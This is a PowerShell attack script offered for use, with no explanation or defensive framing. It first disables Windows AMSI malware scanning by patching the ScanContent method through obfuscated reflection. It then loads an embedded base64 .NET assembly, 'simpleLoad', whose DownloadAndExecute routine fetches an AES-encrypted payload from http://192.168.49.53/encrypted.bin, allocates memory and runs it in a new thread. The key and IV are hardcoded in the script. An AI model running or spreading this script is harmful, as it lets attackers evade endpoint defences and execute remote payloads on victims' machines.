# https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
#
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)

$encodeStr = "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MwQlANkA1AArANEASAM0AOEAMwQGAOEAWQA6AOkABwRAAPEA7AVDAPkAJQBdAPkADAU6AIkAEQFiAAEBxwVnAAEBUgBnAAEBzQJtAAEBvwV0AAEBSwB0AAEBQAR5AJkAMwRnAKEAMwSCABEBIQGOAJkAsAV0ACEB7QAGAIEAMwQGAC4ACwDeAC4AEwDnAC4AGwAGAS4AIwAPAS4AKwAfAS4AMwAfAS4AOwAfAS4AQwAPAS4ASwAlAS4AUwAfAS4AWwAfAS4AYwA9AS4AawBnAS4AcwB0AWMAewDCARoATAB4A0EBAwBzAAEAAAEFAIsAAQAAAQcAXgUBAASAAAABAAAAAAAAAAAAAAAAAJgAAAAEAAAAAAAAAAAAAACWAGYAAAAAAAQAAAAAAAAAAAAAAJYAugMAAAAAAwACAAAAAAAAPD45X18zXzAAPERvd25sb2FkQW5kRXhlY3V0ZT5iX18zXzAAZ2V0X1VURjgAPD45ADxNb2R1bGU+AFN5c3RlbS5JTwBBRVNJVgBnZXRfSVYAc2V0X0lWAERvd25sb2FkRGF0YQBtc2NvcmxpYgA8PmMAVmlydHVhbEFsbG9jAGxwVGhyZWFkSWQAQ3JlYXRlVGhyZWFkAHNpbXBsZUxvYWQAUGFkZGluZ01vZGUAQ3J5cHRvU3RyZWFtTW9kZQBJRGlzcG9zYWJsZQBoSGFuZGxlAENvbWJpbmUAZmxBbGxvY2F0aW9uVHlwZQBEaXNwb3NlAFg1MDlDZXJ0aWZpY2F0ZQBjZXJ0aWZpY2F0ZQBDcmVhdGUARGVsZWdhdGUAV3JpdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARG93bmxvYWRBbmRFeGVjdXRlAGR3U3RhY2tTaXplAGR3U2l6ZQBzZXRfUGFkZGluZwBFbmNvZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAFJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrAGdldF9TZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjawBzZXRfU2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sATWFyc2hhbABrZXJuZWwzMi5kbGwAc2ltcGxlTG9hZC5kbGwAdXJsAENyeXB0b1N0cmVhbQBNZW1vcnlTdHJlYW0AUHJvZ3JhbQBTeXN0ZW0AU3ltbWV0cmljQWxnb3JpdGhtAElDcnlwdG9UcmFuc2Zvcm0AWDUwOUNoYWluAGNoYWluAFN5c3RlbS5SZWZsZWN0aW9uAFplcm8Ac2VuZGVyAFNlcnZpY2VQb2ludE1hbmFnZXIAbHBQYXJhbWV0ZXIALmN0b3IALmNjdG9yAENyZWF0ZURlY3J5cHRvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGR3TWlsbGlzZWNvbmRzAEFlcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAEdldEJ5dGVzAGR3Q3JlYXRpb25GbGFncwBTc2xQb2xpY3lFcnJvcnMAc3NsUG9saWN5RXJyb3JzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBXYWl0Rm9yU2luZ2xlT2JqZWN0AGZsUHJvdGVjdABTeXN0ZW0uTmV0AFdlYkNsaWVudABEZWNyeXB0AFN5c3RlbS5UZXh0AGNpcGhlcnRleHQAVG9BcnJheQBBRVNLZXkAZ2V0X0tleQBzZXRfS2V5AFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkAQ29weQBTeXN0ZW0uTmV0LlNlY3VyaXR5AAAAAAAAAACgHTUZrR7yTL7/GUNXukLLAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFBwIdBRgEAAASWQUgAgEcGAgAAhJtEm0SbQUAAQESWQUgAR0FDgIGGAgABAEdBQgYCBAHBx0FHQUSRRJJEk0SUR0FBAAAEn0EAAASRQUgAQEdBQYgAQERgIUEIAAdBQggAhJJHQUdBQsgAwESgIkSSRGAjQcgAwEdBQgICLd6XFYZNOCJAwYSDAMGElkHAAQYGAkJCQkABhgYCRgYCRgFAAIJGAkGAAMBDg4OCAADHQUdBQ4OAwAAAQogBAIcEl0SYRFlCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAAA8BAApzaW1wbGVMb2FkAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDI0AAApAQAkMzljYWYyNTYtNjEzMC00Mzc3LWFiZjUtY2M0NDg4NWY5MTMwAAAMAQAHMS4wLjAuMAAATQEAHC5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC43LjIBAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lFC5ORVQgRnJhbWV3b3JrIDQuNy4yBAEAAAAAAAAAADZvnMUAAAAAAgAAAFwAAABkLgAAZBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTNmIlgFTtGkCzYrN2Z00r2QEAAABDOlxVc2Vyc1x3aW5cc291cmNlXHJlcG9zXHNpbXBsZUxvYWRcb2JqXHg4NlxSZWxlYXNlXHNpbXBsZUxvYWQucGRiAOguAAAAAAAAAAAAAAIvAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD0LgAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAACwDAAAAAAAAAAAAACwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASMAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAABoAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAPgALAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAHMAaQBtAHAAbABlAEwAbwBhAGQAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAAD4ADwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwBpAG0AcABsAGUATABvAGEAZAAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAyADQAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEYADwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABzAGkAbQBwAGwAZQBMAG8AYQBkAC4AZABsAGwAAAAAADYACwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAcwBpAG0AcABsAGUATABvAGEAZAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAFD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

$decodeStr = [System.Convert]::FromBase64String($encodeStr)
[System.Reflection.Assembly]::Load($decodeStr)
$url = "http://192.168.49.53/encrypted.bin"
$AESKey = "D(G+KbPeShVmYq3t"
$AESIV = "8y/B?E(G+KbPeShV"

[simpleLoad.Program]::DownloadAndExecute($url, $AESKey, $AESIV)
